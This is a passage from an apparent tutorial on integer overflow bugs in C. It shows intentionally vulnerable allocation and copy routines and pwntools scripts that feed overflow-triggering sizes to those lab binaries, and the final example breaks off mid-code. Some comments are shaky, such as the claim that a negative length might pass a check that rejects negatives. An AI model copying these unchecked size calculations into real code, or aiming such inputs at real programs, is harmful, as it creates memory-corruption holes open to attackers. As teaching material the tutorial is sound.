<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">arr</span><span class="o">-&gt;</span><span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">count</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">arr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">fill_array</span><span class="p">(</span><span class="n">int_array</span><span class="w"> </span><span class="o">*</span><span class="n">arr</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Filling array with value %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// This loop might access beyond allocated memory</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">size_t</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">arr</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">arr</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;count&gt; &lt;value&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">atoll</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

<span class="w">    </span><span class="n">int_array</span><span class="w"> </span><span class="o">*</span><span class="n">arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">create_array</span><span class="p">(</span><span class="n">count</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">arr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">fill_array</span><span class="p">(</span><span class="n">arr</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Array operations completed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">arr</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">arr</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<h3 id="length-validation-bypass">Length Validation Bypass</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1">// vuln_length.c</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>

<span class="cp">#define MAX_SIZE 1024</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">process_data</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Length validation</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">MAX_SIZE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Data too long: %u &gt; %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_SIZE</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Processing data of length: %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// VULNERABLE: length - 1 can underflow</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">buffer</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Allocation failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Copy data (potential heap overflow)</span>
<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Data processed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;data&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

<span class="w">    </span><span class="n">process_data</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<h3 id="sign-extension-vulnerability">Sign Extension Vulnerability</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1">// vuln_sign.c</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">copy_data</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">src</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">src_len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Check for reasonable length</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">src_len</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">src_len</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid length: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">src_len</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Copying %d bytes</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">src_len</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// VULNERABLE: sign extension when casting to size_t</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">dest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">src_len</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">dest</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Allocation failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// memcpy expects size_t (unsigned), but src_len is signed</span>
<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span><span class="w"> </span><span class="n">src</span><span class="p">,</span><span class="w"> </span><span class="n">src_len</span><span class="p">);</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Copy completed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">dest</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;data&gt; &lt;length&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

<span class="w">    </span><span class="n">copy_data</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<h2 id="exploitation-techniques">Exploitation Techniques</h2>
<h3 id="heap-overflow-via-integer-overflow">Heap Overflow via Integer Overflow</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span>
<span class="normal">57</span>
<span class="normal">58</span>
<span class="normal">59</span>
<span class="normal">60</span>
<span class="normal">61</span>
<span class="normal">62</span>
<span class="normal">63</span>
<span class="normal">64</span>
<span class="normal">65</span>
<span class="normal">66</span>
<span class="normal">67</span>
<span class="normal">68</span>
<span class="normal">69</span>
<span class="normal">70</span>
<span class="normal">71</span>
<span class="normal">72</span>
<span class="normal">73</span>
<span class="normal">74</span>
<span class="normal">75</span>
<span class="normal">76</span>
<span class="normal">77</span>
<span class="normal">78</span>
<span class="normal">79</span>
<span class="normal">80</span>
<span class="normal">81</span>
<span class="normal">82</span>
<span class="normal">83</span>
<span class="normal">84</span>
<span class="normal">85</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span><span class="w"> </span><span class="nf">exploit_malloc_overflow</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Exploit malloc size calculation overflow&quot;&quot;&quot;</span>

    <span class="c1"># When size + 1 overflows, malloc allocates small buffer</span>
    <span class="c1"># but memset writes large amount</span>

    <span class="c1"># UINT_MAX = 4294967295</span>
    <span class="c1"># UINT_MAX + 1 = 0 (overflow)</span>
    <span class="c1"># malloc(0) might return small buffer or NULL</span>

    <span class="n">overflow_size</span> <span class="o">=</span> <span class="mh">0xffffffff</span>  <span class="c1"># UINT_MAX</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./vuln_overflow&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">overflow_size</span><span class="p">)])</span>

    <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Overflow attempt output:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>

    <span class="c1"># Check if program crashed</span>
    <span class="k">if</span> <span class="n">p</span><span class="o">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Program crashed - potential overflow exploitation&quot;</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">exploit_array_allocation</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Exploit array allocation overflow&quot;&quot;&quot;</span>

    <span class="c1"># Find count where count * sizeof(int) overflows</span>
    <span class="c1"># sizeof(int) = 4 on most systems</span>
    <span class="c1"># We want count * 4 to overflow back to small value</span>

    <span class="c1"># 2^64 / 4 = 2^62</span>
    <span class="c1"># Values around this will cause overflow</span>

    <span class="n">overflow_count</span> <span class="o">=</span> <span class="mh">0x4000000000000000</span>  <span class="c1"># Large value that overflows</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./vuln_array_alloc&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">overflow_count</span><span class="p">),</span> <span class="s1">&#39;42&#39;</span><span class="p">])</span>

    <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Array allocation overflow:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>

    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">exploit_length_underflow</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Exploit length - 1 underflow&quot;&quot;&quot;</span>

    <span class="c1"># When length = 0, length - 1 underflows to UINT_MAX</span>
    <span class="c1"># malloc(UINT_MAX) likely fails, but if it succeeds,</span>
    <span class="c1"># memcpy will copy 0 bytes but think buffer is huge</span>

    <span class="c1"># Send empty string (length = 0)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./vuln_length&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">])</span>

    <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Length underflow attempt:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>

    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">exploit_sign_extension</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Exploit sign extension vulnerability&quot;&quot;&quot;</span>

    <span class="c1"># Use large positive value that becomes negative when cast to int</span>
    <span class="c1"># 0x80000000 = 2147483648 as unsigned = -2147483648 as signed</span>

    <span class="n">large_value</span> <span class="o">=</span> <span class="mh">0x80000000</span>

    <span class="c1"># This might pass the check (large_value as int is negative)</span>
    <span class="c1"># but memcpy sees it as large positive value</span>

    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">100</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./vuln_sign&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="nb">str</span><span class="p">(</span><span class="n">large_value</span><span class="p">)])</span>

    <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Sign extension exploit:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>

    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">exploit_malloc_overflow</span><span class="p">()</span>
</code></pre></div></td></tr></table></div>
<h3 id="bypassing-size-checks">Bypassing Size Checks</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">  1</span>
<span class="normal">  2</span>
<span class="normal">  3</span>
<span class="normal">  4</span>
<span class="normal">  5</span>
<span class="normal">  6</span>
<span class="normal">  7</span>
<span class="normal">  8</span>
<span class="normal">  9</span>
<span class="normal"> 10</span>
<span class="normal"> 11</span>
<span class="normal"> 12</span>
<span class="normal"> 13</span>
<span class="normal"> 14</span>
<span class="normal"> 15</span>
<span class="normal"> 16</span>
<span class="normal"> 17</span>
<span class="normal"> 18</span>
<span class="normal"> 19</span>
<span class="normal"> 20</span>
<span class="normal"> 21</span>
<span class="normal"> 22</span>
<span class="normal"> 23</span>
<span class="normal"> 24</span>
<span class="normal"> 25</span>
<span class="normal"> 26</span>
<span class="normal"> 27</span>
<span class="normal"> 28</span>
<span class="normal"> 29</span>
<span class="normal"> 30</span>
<span class="normal"> 31</span>
<span class="normal"> 32</span>
<span class="normal"> 33</span>
<span class="normal"> 34</span>
<span class="normal"> 35</span>
<span class="normal"> 36</span>
<span class="normal"> 37</span>
<span class="normal"> 38</span>
<span class="normal"> 39</span>
<span class="normal"> 40</span>
<span class="normal"> 41</span>
<span class="normal"> 42</span>
<span class="normal"> 43</span>
<span class="normal"> 44</span>
<span class="normal"> 45</span>
<span class="normal"> 46</span>
<span class="normal"> 47</span>
<span class="normal"> 48</span>
<span class="normal"> 49</span>
<span class="normal"> 50</span>
<span class="normal"> 51</span>
<span class="normal"> 52</span>
<span class="normal"> 53</span>
<span class="normal"> 54</span>
<span class="normal"> 55</span>
<span class="normal"> 56</span>
<span class="normal"> 57</span>
<span class="normal"> 58</span>
<span class="normal"> 59</span>
<span class="normal"> 60</span>
<span class="normal"> 61</span>
<span class="normal"> 62</span>
<span class="normal"> 63</span>
<span class="normal"> 64</span>
<span class="normal"> 65</span>
<span class="normal"> 66</span>
<span class="normal"> 67</span>
<span class="normal"> 68</span>
<span class="normal"> 69</span>
<span class="normal"> 70</span>
<span class="normal"> 71</span>
<span class="normal"> 72</span>
<span class="normal"> 73</span>
<span class="normal"> 74</span>
<span class="normal"> 75</span>
<span class="normal"> 76</span>
<span class="normal"> 77</span>
<span class="normal"> 78</span>
<span class="normal"> 79</span>
<span class="normal"> 80</span>
<span class="normal"> 81</span>
<span class="normal"> 82</span>
<span class="normal"> 83</span>
<span class="normal"> 84</span>
<span class="normal"> 85</span>
<span class="normal"> 86</span>
<span class="normal"> 87</span>
<span class="normal"> 88</span>
<span class="normal"> 89</span>
<span class="normal"> 90</span>
<span class="normal"> 91</span>
<span class="normal"> 92</span>
<span class="normal"> 93</span>
<span class="normal"> 94</span>
<span class="normal"> 95</span>
<span class="normal"> 96</span>
<span class="normal"> 97</span>
<span class="normal"> 98</span>
<span class="normal"> 99</span>
<span class="normal">100</span>
<span class="normal">101</span>
<span class="normal">102</span>
<span class="normal">103</span>
<span class="normal">104</span>
<span class="normal">105</span>
<span class="normal">106</span>
<span class="normal">107</span>
<span class="normal">108</span>
<span class="normal">109</span>
<span class="normal">110</span>
<span class="normal">111</span>
<span class="normal">112</span>
<span class="normal">113</span>
<span class="normal">114</span>
<span class="normal">115</span>
<span class="normal">116</span>
<span class="normal">117</span>
<span class="normal">118</span>
<span class="normal">119</span>
<span class="normal">120</span>
<span class="normal">121</span>
<span class="normal">122</span>
<span class="normal">123</span>
<span class="normal">124</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span><span class="w"> </span><span class="nf">bypass_size_validation</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Bypass size validation using integer overflow&quot;&quot;&quot;</span>

    <span class="n">size_check_c</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">#include &lt;stdio.h&gt;</span>
<span class="s1">#include &lt;stdlib.h&gt;</span>
<span class="s1">#include &lt;string.h&gt;</span>

<span class="s1">#define MAX_BUFFER_SIZE 1024</span>

<span class="s1">void process_input(unsigned int size1, unsigned int size2) {</span>
<span class="s1">    // Validation: individual sizes are reasonable</span>
<span class="s1">    if (size1 &gt; MAX_BUFFER_SIZE || size2 &gt; MAX_BUFFER_SIZE) {</span>
<span class="s1">        printf(&quot;Size too large</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">        return;</span>
<span class="s1">    }</span>

<span class="s1">    // VULNERABLE: size1 + size2 can overflow</span>
<span class="s1">    unsigned int total_size = size1 + size2;</span>

<span class="s1">    printf(&quot;Allocating buffer of size: </span><span class="si">%u</span><span class="se">\\</span><span class="s1">n&quot;, total_size);</span>

<span class="s1">    char *buffer = malloc(total_size);</span>
<span class="s1">    if (!buffer) {</span>
<span class="s1">        printf(&quot;Allocation failed</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">        return;</span>
<span class="s1">    }</span>

<span class="s1">    // Fill first part</span>
<span class="s1">    memset(buffer, &#39;A&#39;, size1);</span>

<span class="s1">    // Fill second part  </span>
<span class="s1">    memset(buffer + size1, &#39;B&#39;, size2);</span>

<span class="s1">    printf(&quot;Buffer filled</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">    free(buffer);</span>
<span class="s1">}</span>

<span class="s1">int main(int argc, char *argv[]) {</span>
<span class="s1">    if (argc != 3) return 1;</span>

